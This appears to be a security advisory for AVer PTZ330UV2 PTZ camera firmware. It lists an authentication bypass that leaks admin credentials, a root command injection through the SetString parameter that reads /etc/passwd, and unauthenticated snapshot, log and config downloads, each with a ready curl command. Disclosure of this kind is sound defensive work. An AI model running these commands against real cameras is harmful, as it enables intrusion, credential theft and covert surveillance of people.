## AVer-PTZ330UV2 Firmware Version 0.0.0000.50 / A027 / BB354DE9

1) Authentication Bypass via /action HTTP Route (High)

The following HTTP Route leaks the username and password for the administrator user of the application. You do not need credentials to recover this information:

```
curl 'http://<IP>/action?Get=acc'
```

2) Remote code execution via /cgi-bin's SetString method (High)

An authenticated RCE vulnerability exists when a semicolon is appended to the HTTP GET query parameter SetString of /cgi-bin. This executes commands under the context of root. When chained with the first issue, this becomes an unauthenticated RCE vulnerability.  Note that this feature blacklists spaces, the pipe character, the dollar sign character, but accepts file redirection using angle brackets. URI encoding and plus characters do not work and are reflected by the application.

```
curl -u 'USERNAME:PASSWORD' 'http://<IP>/cgi-bin?SetString=sys_log_ip,127.0.0.1;cat</etc/passwd'
```

By using the command sequence ';cd;find', I was able to search for application logs to poison. Afterwards, the command sequence ';sh</PATH/TO/POISONED_LOGS' was used to obtain full RCE. Full killchain has been redacted for safety reasons. 

Furthermore, the hashes for the root user and the avermediainfo account are stored in the passwd file in crypt format. In theory, these could be trivially cracked using modern video cards and used to login to the SSH service listening on the non standard port 1587. Have not compared this hash across instances of the device, so I am unsure if the password is shared between different instances.

3) Screenshot feature does not require authentication (Medium)

A snapshot of the camera feed can be exfiltrated without authentication. From testing, using this feature seems to break the camera feed, requiring power cycle of the device.

```
curl 'http://<IP>/snapshot/snapshot' -o snapshot.jpg
```

4) System log export feature does not require authentication (Low)

The camera application logs can be exported without authentication.

```
curl 'http://<IP>/OutLog/aver.syslog'
```

5) System configuration export download feature does not require authentication (Low)

The exported device configuration can be downloaded in bzip2 format without authentication.

```
curl 'http://<IP>/OutFolder/export_camera.bin' -o config.bz2
```

Note that this only works if the application user had previously exported the camera configuration during the boot time of the device, which does require authentication. The request that exports the camera configuration is as follows:

```
curl -u 'USERNAME:PASSWORD' 'http://<IP>/cg-bin?DULFile'
```

This configuration file contains all the device settings inside of a file named options.json, including the plaintext username and password for the device. This can be an alternate way of obtaining credentials, albeit under narrow conditions.
